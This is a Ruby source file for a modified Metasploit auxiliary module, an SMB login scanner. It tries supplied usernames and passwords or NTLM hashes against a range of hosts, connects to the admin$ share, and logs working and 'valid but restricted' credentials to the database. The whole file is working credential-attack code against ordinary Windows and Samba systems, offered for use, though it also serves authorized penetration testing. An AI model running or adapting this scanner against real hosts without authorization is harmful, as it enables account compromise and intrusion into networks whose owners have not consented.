##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute


	def proto
		'smb'
	end
	def initialize
		super(
			'Name'           => 'SMB Login Check Scanner',
			'Description'    => %q{
				This module will test a SMB login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.

				addenial update - removed multiple checks for bogus user, bogus domain, etc. Only single user and pass checks are performed.
					SMB login has also been changed from ipc$ to admin$
			},
			'Author'         =>
				[
					'tebo <tebo [at] attackresearch [dot] com>', # Original
					'Ben Campbell <eat_meatballs [at] hotmail.co.uk>', # Refactoring
					'addenial <peter.mars [at] outlook [dot] com>' # Update 
				],
			'References'     =>
				[
					[ 'CVE', '1999-0506'], # Weak password

				],
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST','USERNAME','PASSWORD','BLANK_PASSWORDS','USER_AS_PASS')


		@correct_credentials_status_codes = [
			"STATUS_INVALID_LOGON_HOURS",
			"STATUS_INVALID_WORKSTATION",
			"STATUS_ACCOUNT_RESTRICTION",
			"STATUS_ACCOUNT_EXPIRED",
			"STATUS_ACCOUNT_DISABLED",
			"STATUS_ACCOUNT_RESTRICTION",
			"STATUS_PASSWORD_EXPIRED",
			"STATUS_PASSWORD_MUST_CHANGE",
			"STATUS_LOGON_TYPE_NOT_GRANTED"
		]

		# These are normally advanced options, but for this module they have a
		# more active role, so make them regular options.
		register_options(
			[
				OptString.new('SMBPass', [ false, "SMB Password" ]),
				OptString.new('SMBUser', [ false, "SMB Username" ]),
				OptString.new('SMBDomain', [ false, "SMB Domain", 'localhost']),
			], self.class)

	end

	def run_host(ip)
		
		domain = datastore['SMBDomain']

		begin
			each_user_pass do |user, pass|
				result = try_user_pass(domain, user, pass)
			end
		rescue ::Rex::ConnectionError
			nil
		end

	end

	def check_login_status(domain, user, pass)
		connect()
		status_code = ""
		begin
			simple.login(
				datastore['SMBName'],
				user,
				pass,
				domain,
				datastore['SMB::VerifySignature'],
				datastore['NTLM::UseNTLMv2'],
				datastore['NTLM::UseNTLM2_session'],
				datastore['NTLM::SendLM'],
				datastore['NTLM::UseLMKey'],
				datastore['NTLM::SendNTLM'],
				datastore['SMB::Native_OS'],
				datastore['SMB::Native_LM'],
				{:use_spn => datastore['NTLM::SendSPN'], :name =>  self.rhost}
			)

			# Windows SMB will return an error code during Session Setup, but nix Samba requires a Tree Connect:
			simple.connect("\\\\#{datastore['RHOST']}\\admin$")
			status_code = 'STATUS_SUCCESS'
		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
			status_code = e.get_error(e.error_code)
		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
			status_code = e.error_reason
		ensure
			disconnect()
		end

		return status_code
	end


	def try_user_pass(domain, user, pass)

		status = check_login_status(domain, user, pass)

		domain_part = " \\\\#{domain}"
		
		output_message = "#{rhost}:#{rport}#{domain_part} - ".gsub('%', '%%')
		output_message << "%s"
		output_message << " (#{smb_peer_os}) #{user} : #{pass} [#{status}]".gsub('%', '%%')

		case status
		when 'STATUS_SUCCESS'

				print_good(output_message % "SUCCESSFUL LOGIN")
				
				report_creds(domain,user,pass,true)
		
			return :next_user

		when *@correct_credentials_status_codes
			print_status(output_message % "FAILED LOGIN, VALID CREDENTIALS" )
			report_creds(domain,user,pass,false)
			
			return :skip_user

		when 'STATUS_LOGON_FAILURE', 'STATUS_ACCESS_DENIED'
			vprint_error(output_message % "FAILED LOGIN")
		else
			vprint_error(output_message % "FAILED LOGIN")
		end
	end


	def note_creds(domain,user,pass,reason)
		report_note(
			:host	=> rhost,
			:proto => 'tcp',
			:sname	=> 'smb',
			:port   =>  datastore['RPORT'],
			:type   => 'smb.account.info',
			:data 	=> {:user => user, :pass => pass, :status => reason},
			:update => :unique_data
		)
	end

	def report_creds(domain,user,pass,active)

		login_name = "#{domain}\\#{user}"

		report_hash = {
			:host	=> rhost,
			:port   => datastore['RPORT'],
			:sname	=> 'smb',
			:user 	=> login_name,
			:pass   => pass,
			:source_type => "user_supplied",
			:active => active
		}

		if pass =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
			report_hash.merge!({:type => 'smb_hash'})
		else
			report_hash.merge!({:type => 'password'})
		end
		report_auth_info(report_hash)
	end
end
